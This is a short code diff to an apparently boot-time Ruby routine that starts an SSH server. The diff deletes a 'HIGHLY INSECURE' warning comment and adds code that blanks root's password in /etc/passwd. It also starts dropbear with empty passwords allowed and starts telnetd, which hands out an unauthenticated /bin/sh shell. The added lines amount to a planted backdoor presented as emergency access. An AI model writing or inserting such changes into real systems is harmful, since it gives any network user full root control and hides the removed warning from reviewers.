@@ -53,9 +53,21 @@ in
           
           def run()
             FileUtils.mkdir_p("/etc/dropbear")
-            # THIS IS HIGHLY INSECURE
-            # This allows blank login passwords.
+            # Ensure root has an unlocked empty password in /etc/passwd
+            begin
+              if File.exist?("/etc/passwd")
+                passwd = File.read("/etc/passwd").gsub(/^root:[^:]*:/, "root::")
+                File.write("/etc/passwd", passwd)
+              end
+            rescue => e
+              $logger.warn("Could not patch /etc/passwd: #{e.message}")
+            end
+            # Spawn dropbear allowing blank passwords (-B)
             System.spawn("dropbear", "-ERB", "-b", "/etc/banner")
+            # Spawn telnetd for immediate, unauthenticated emergency shell access
+            if System.which("telnetd")
+              System.spawn("telnetd", "-l", "/bin/sh")
+            end
           end
         end
       '')
